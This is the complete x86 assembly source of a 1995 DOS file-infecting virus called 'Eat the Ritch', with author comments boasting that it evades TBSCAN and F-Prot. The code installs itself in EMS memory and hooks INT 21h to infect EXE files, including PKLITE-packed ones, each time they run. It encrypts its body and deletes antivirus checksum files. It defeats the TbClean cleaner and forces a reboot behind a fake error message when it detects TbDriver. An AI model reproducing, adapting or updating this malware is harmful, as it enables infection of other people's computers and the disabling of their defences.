;Virus Name ; Eat the Ritch
;Type       ; EMS TSR Dos EXE/PKlited EXE infector
;Good Points; WDBI Capable,infects PKlited exe's, 32bit Disk frendly,
;           ; EMM friendly Not detecable by TBscan 6.32 and F-Prot 2.16d
;Author     ; Stalker X /Sx
;PS:link as EXE

;Notes:
;
;Well here is my latest virus. This one is undetectable by TBSCAN v6.33!
;And F-Prot v2.16d!. There is a rather good improvement in TBAV v6.33
;is has less false detects on normal hueristic scanning and all around
;TBAV v6.33 gives i bit more secure protection .. about 0.00000001% more :)
;Ok this Virus cannot be cleaned by TBCLEAN v6.33 or down ..
;it gives an error and reboots the computer when it detects tbdriver is
;active.
;It runs under windows 32bit and does infect any dos boxes opend by the user.
;It goes TSR in EMS and one SECRET WEPON AGAINS the O Mighty Thunder Byte
;an ... an ... an .... yes .. yes .. INT 12. HEHEHEH yes thats correct
;Check this one out ... 

;O one more thingggy it infects PKLITED EXE's too and deletes the obvuis
;CRC check files ... 


%out Another Virus by SX/NuKE
%out Direct form The Nightmare Factory

DcSize    equ (BodyStart-VStub)
VirusSize equ (BodyEnd-VStub)
BodySize  equ (BodyEnd-BodyStart) 

 jumps
.model tiny
.286
.code
 assume cs:@code
 org 0

;;Virus;Decoder;Stub;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
VStub    :    int 12h                    ;Throw off Tbscan
              mov cx,VirusSize           ;Decoder stuff
               db 0bfh                   ;!
DcStart        dw BodyStart              ;!
DCode    :     db 2eh,81h,35h            ;! 
DcKey          dw 0                      ;!
              inc di                     ;!
             loop DCode                  ;!

;;Virus;Setup;Routines;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
BodyStart:  push cs                      ;Save cs
         pop ss                      ;Restore cs in ss
              db 0bdh                    ;Setup the delta ofs
Delta         dw 0                       ;Varible for delta

;;Get;INT21;SEG:OFS;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
             mov ds,bx                   ;ds=0
             lds si,dword ptr ds:[21h*4] ;Get SEG:OFS
         mov word ptr cs:[bp+Old21],si;Save OFS
         mov word ptr cs:[bp+Old21+2],ds;Save SEG

;;Start;Virus;Stuffies;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
        push cs                      ;Save cs
             pop ds                      ;Restore cs in ds
            push es                      ;Save PSP

             lea dx,[bp+TBfile]          ;Set source  
         mov ax,4301h                ;Set new file attribute
         xor cx,cx                   ;Clear attribute in cx
         int 21h                     ;Do it.

             mov ah,41h                  ;Delete file
             lea dx,[bp+TBfile]          ;!
             int 21h                     ;!

             lea dx,[bp+CPfile]          ;Set source  
         mov ax,4301h                ;Set new file attribute
         xor cx,cx                   ;Clear attribute in cx
         int 21h                     ;Do it.
 
             mov ah,41h                  ;!
             lea dx,[bp+CPfile]          ;!
             int 21h                     ;!

             lea dx,[bp+MSfile]          ;Set source  
         mov ax,4301h                ;Set new file attribute
         xor cx,cx                   ;Clear attribute in cx
         int 21h                     ;Do it.

             mov ah,41h                  ;!
             lea dx,[bp+MSfile]          ;!
             int 21h                     ;!

No_TBClean:pushf                         ;Save flags
         int 1                       ;Call int 1
       pushf                         ;Save flags
         pop ax                      ;Resstore flags in bx
         pop bx                      ;Restore flags in bx
         cmp ax,bx                   ;Detect TbClean
         mov ax,4bfeh                ;Check ID function set
              je Check_ID                ;Jmp into never never land
             int 20h                     ;Kill Cleaning scan    

Check_ID:    int 21h                     ;Do it.
         cmp ah,13                   ;Check return code.
          je @RETURN                 ;EXIT If active.

CHK_TBDriver:mov ax,0ca40h               ;Check if TbDriver v6.3x is installed
         int 2fh                     ;Do it.
         cmp ax,0ca3fh               ;Check id returned
         jne Install_ETR             ;if not CA3Fh then continue infection
         lea dx,[bp+ErrMsg]          ;Setup dx with ErrMsg
         mov ah,9                    ;Set print function
         int 21h                     ;Print Error Message
         int 19h                     ;Reboot

ErrMsg db 'TbDriver, TBAV TSR utilities driver (C) Copyright 1992-94'
       db ' Thunderbyte BV.',10,13,'; ERROR!.',7,7,7,'$'

TBfile db 'anti-vir.dat',0
CPfile db 'chklist.cps',0
MSfile db 'chklist.ms',0
Dummy  dw 0

;;EMS;Driver;Check;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Install_ETR: mov ax,3567h                ;Get INT vec 67h
             int 21h                     ;Do it.
         mov di,0Ch                  ;Offset of 'EMMXXXX'
         cmp word ptr es:[di],'XM'   ;Check for 'MX' id
         jne @RETURN                 ;If not found continue normal exec.

;;Allocate;EMS;Memory;and;Map;Page;0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         mov ah,41h                  ;Get Pageframe Start
         int 67h                     ;Do it.
        push bx                      ;Save the Page 0 address

         mov ah,42h                  ;Check available Pages
         int 67h                     ;Do it.
          or ah,ah                   ;Check return code
         jnz @RETURN                 ;Exit to program on error
          or bx,bx                   ;Check if pages=0
          jz @RETURN                 ;if 0 then exit to program

         mov bx,1                    ;One 16k Page
         mov ah,43h                  ;Allocate Pages
         int 67h                     ;Do it
          or ah,ah                   ;Check return code
         jnz @RETURN                 ;Exit to program in error

         xor bx,bx                   ;Map 1 page to phisical page 0
         mov ax,4400h                ;Map Page
         int 67h                     ;Do it

;;Copy;Virus;to;PageFrame;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         pop es                      ;Set Pageframe address
         xor di,di                   ;Clear di
         lea si,[bp+VStub]           ;Set Si to source
         mov cx,VirusSize/2          ;Set Cs to size of virus in words
         rep movsw                   ;Copy Virus to memory

;;hook;ints;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
            push ds                      ;Save ds
             mov ds,cx                   ;ds=0
             mov bx,21h*4                ;bx=int 21h addr
         cli                         ;Clear interrupt falg
         mov word ptr ds:[bx],offset ETR_TSR
         mov word ptr ds:[bx+2],es   ;!
         sti                         ;Set interrupt flag
             pop ds                      ;Restore ds

@RETURN:     pop bx                      ;bx=PSP
         mov ax,10h                  ;!
         add ax,bx                   ;Calc new cs
         add [bp+_CS],ax             ;Save new cs
         add ax,[bp+_SS]             ;Calc new ss
         mov es,bx                   ;es=PSP
         mov ds,bx                   ;ds=PSP
         mov bx,[bp+_SP]             ;bx=Old sp
         cli                         ;Clear interrupt falg
         mov ss,ax                   ;ss=New ss
         mov sp,bx                   ;sp=Org sp
         sti                         ;Set interrupt flag
          db 0eah                    ;Far Jmp
_IP           dw 0                       ;New ip
_CS           dw 0-10h                   ;New cs
_SP           dw ?                       ;New sp
_SS           dw ?                       ;New ss
MYID          db 'Eat the Ritch virus by Sx (c) 1995 AeroSmith Rulze!'

ETR_TSR:   pushf                         ;Save Flags
       pusha                         ;Save all general registers
        push ds                      ;Save ds
        push es                      ;Save es
             cld                         ;Clear direction flag

;;Check;Call;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         cmp ax,4B00h                ;Check function call
          je Infect                  ;If execute file then infect
         cmp ax,4BFEh                ;Check if Virus ID
         jne Exit_TSR                ;If not any of them then continue
         pop es                      ;Restore Es
         pop ds                      ;Restore Ds
        popa                         ;Restore All general registers
        popf                         ;Restore flags
         mov ah,13                   ;Set virus ID
        iret                         ;Interrupt return

;;Start;Infection;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Infect:      mov si,dx                   ;Set source

Find_0:    lodsb                         ;Load next byte
             cmp al,0                    ;Find the end of the program name.
         jne Find_0                  ;Loop until found

;;Check;as;not;to;infect;WIN386.EXE;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         cmp word ptr ds:[si-7],'68' ;Check that the current program
          je Exit_TSR                ;executed is NOT WIN386.EXE
         cmp word ptr ds:[si-9],'3N' ;or WIN286.EXE
          je Exit_TSR                ;!
         cmp word ptr ds:[si-9],'2N' ;!
          je Exit_TSR                ;!

;;All;ok;So;far;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
        push ds                      ;Save for later use by attrib
        push dx                      ;Save for later use by attrib

         mov ax,4300h                ;Get file attribute
        call Int21h                  ;Do it.
        push cx                      ;Save the org attrib in cx on stack

         mov ax,4301h                ;Set new file attribute
         xor cx,cx                   ;Clear attribute in cx
        call Int21h                  ;Do it.

         mov ax,3d02h                ;Open file for read and write
        call Int21h                  ;Do it.
          jc Exit_TSR                ;Exit to org TSR if error
         mov bx,ax                   ;Save handle in bx

         mov ax,5700h                ;Get file Time and Date
        call Int21h                  ;Do it.
        push dx                      ;Save dx on stack
        push cx                      ;Save cx on stack

        push cs                      ;Save cs
         pop ds                      ;Restore cs in ds for general use
             mov ax,'ZM'                 ;!
             mov es,ax                   ;Save ax in es for later use

         mov dx,offset Signature     ;Set dx to Dest array
         mov cx,24                   ;cx=size to read
         mov ah,3fh                  ;Set function
        call Int21h                  ;Do it.
          jc CloseF                  ;Close file on error

             mov cx,es                   ;cx='ZM'
         cmp cs:[Signature],cx       ;Make sure it's EXE file
         jne CloseF                  ;Close file if it's not
         cmp cs:[Negative_checksum],9;Make sure it's not infected already
          je CloseF                  ;Close file if it is

             xor cx,cx                   ;Clear cx
         mov dx,3ah                  ;cx:dx -> PTR to WIN Header
         mov ax,4200h                ;Set file pointer location
        call Int21h                  ;Do it.

         mov dx,offset NewPtr_MSW    ;Set dx to Dest array
         mov cx,4                    ;cx=size to read (4 byte ptr)
             mov ah,3fh                  ;Set function     
            call Int21h                  ;Do it.     

             mov cx,cs:[NewPtr_MSW]      ;Set new pointer     
             mov dx,cs:[NewPtr_LSW]      ;Set new pointer     
         mov ax,4200h                ;Goto extended header in file
        call Int21h                  ;Do it.      

         mov dx,offset NewPtr_MSW    ;Set dx to Dest Array
         mov cx,2                    ;cx=size to read 2 ID bytes
         mov ah,3fh                  ;Set function
            call Int21h                  ;Do it.     

         cmp cs:[NewPtr_MSW],'EN'    ;Check for windos exe
              je CloseF                  ;Close file if windows     
             cmp cs:[NewPtr_MSW],'EL'    ;Check for windos exe     
              je CloseF                  ;Close file if windows     
             cmp cs:[NewPtr_MSW],'XL'    ;Check for windos exe     
              je CloseF                  ;Close file if windows     

             mov cs:[Negative_checksum],9;!

;>Modify EXE header and calculate new header values<
             push cs:[Pre_Reloc_CS]      ;Save Org cs
              pop cs:[_CS]               ;Restore Org cs in _CS
             push cs:[Pre_Reloc_IP]      ;Save Org ip
              pop cs:[_IP]               ;Restore Org ip in _IP
             push cs:[PreReloc_SS]       ;Save Org ss
              pop cs:[_SS]               ;Restore Org ss in _SS
             push cs:[Initial_SP]        ;Save Org sp
              pop cs:[_SP]               ;Restore Org sp in _SP
 
              xor cx,cx                  ;Clear cx
              xor dx,dx                  ;Clear dx
              mov ax,4202h               ;Get file length
             call Int21h                 ;Do it.
             push dx                     ;Save dx
             push ax                     ;Save ax

              mov cx,VirusSize           ;cx=Virus size
              add ax,cx                  ;Add to File length
              adc dx,0                   ;DX:AX File+Virus

             push ax                     ;Save Ax
              shr ax,9                   ;Div dx:ax 512
              ror dx,9                   ;!  
              stc                        ;Set carry
          adc dx,ax                  ;Dx+Ax
          pop ax                     ;Restore Ax
          and ah,1                   ;MOD 512
          mov cs:[File_Pages],dx     ;Save File pages
          mov cs:[Last_Page_Size],ax ;Save MOD 512
  
              pop ax                     ;Restore ax
              pop dx                     ;Restore dx

             push bx                     ;Save Bx
          mov bx,cs:[Header_Paras]   ;Set Bx=Header Paragraph
          shl bx,4                   ;Bx*16
          sub ax,bx                  ;Ax-Bx
          sbb dx,0                   ;DX:AX filesize-header
          mov cx,16                  ;Cx=16
          div cx                     ;[Dx:Ax]/16 
              mov cs:[Delta],dx          ;Save Delta ofs
              mov cs:[Initial_SP],0      ;Set SP=FFFF
              mov cs:[DcStart],offset BodyStart
              add cs:[DcStart],dx        ;Adjust starting point to decode
              mov cs:[Pre_Reloc_IP],dx   ;Save new Ip
              mov cs:[Pre_Reloc_CS],ax   ;Save new Cs
          pop bx                     ;Restore Bx

              xor cx,cx                  ;Clear Cx
              xor dx,dx                  ;Clear Dx
          mov ax,4200h               ;Rewind file pointer
         call Int21h                 ;Do it.

              mov ah,40h                 ;Write Header back
          mov cx,24                  ;Cx=size to write back
          mov dx,offset Signature    ;Dx=source
         call Int21h                 ;Do it.

              xor cx,cx                  ;Clear Cx     
              xor dx,dx                  ;Clear Dx      
          mov ax,4202h               ;Set File point to EOF     
         call Int21h                 ;Do it.      

             call RandomNumber
              mov cs:[DcKey],dx

             push cs                     ;Save cs
              pop es                     ;Restore cs in es 
              xor si,si                  ;Clear cs 
              mov di,offset ETRAllEnd    ;Set dest
              mov cx,VirusSize/2         ;Set size
              rep movsw                  ;Copy virus

              mov ax,cs:[DcKey]
              mov si,offset ETRAllEnd+DcSize
              mov cx,BodySize
EnCode  :     xor word ptr cs:[si],ax
              inc si
             loop EnCode

              mov ah,40h                 ;Write Virus Encoded Body
          mov cx,VirusSize           ;!
              mov dx,offset ETRAllEnd    ;!
             call Int21h                 ;Do it.

CloseF:       pop cx                     ;Restore cx
              pop dx                     ;Restore dx
              mov ax,5701h               ;Set file time and date
             call Int21h                 ;Do it.

              mov ah,3eh                 ;Close file
         call Int21h                 ;Do it.

              pop cx                     ;Restore cx
              pop dx                     ;Restore dx
              pop ds                     ;Restore ds
          mov ax,4301h               ;Set file attribute
         call Int21h                 ;Do it.

Exit_TSR   :  pop es                     ;Restore Es
          pop ds                     ;Restore Ds
         popa                        ;Restore all general registers
         popf                        ;Restore flags

           db 0eah                   ;Far Jmp to org Int 21h
Old21          dd ?                      ;Var for int vec

Int21h     :pushf                        ;Save Flags
         call dword ptr cs:[Old21]   ;Call Org Int 21h
             retn                        ;Return to caller

RandomNumber :xor ah,ah                  ;Clear ah
          int 1ah                    ;Get Time
          mov al,00000110b           ;Set al=Mask
          out 43h,al                 ;Get PIT value
           in al,40h                 ;al=Value
          xor dl,al                  ;Xor dl,al
           in al,40h                 ;al=Next Value
          xor dh,al                  ;!
         retn                        ;Return to caller
BodyEnd:

Signature          dw ?                  ; 'MZ'
Last_Page_Size     dw ?                  ;
File_Pages         dw ?                  ;
Reloc_Items        dw ?                  ;
Header_Paras       dw ?                  ;
MinAlloc           dw ?                  ;
MaxAlloc           dw ?                  ;
PreReloc_SS        dw ?                  ;
Initial_SP         dw ?                  ;
Negative_checksum  dw ?                  ;
Pre_Reloc_IP       dw ?                  ;
Pre_Reloc_CS       dw ?                  ;
NewPtr_MSW         dw ?                  ;
NewPtr_LSW         dw ?                  ;
ETRAllEnd:
END VStub
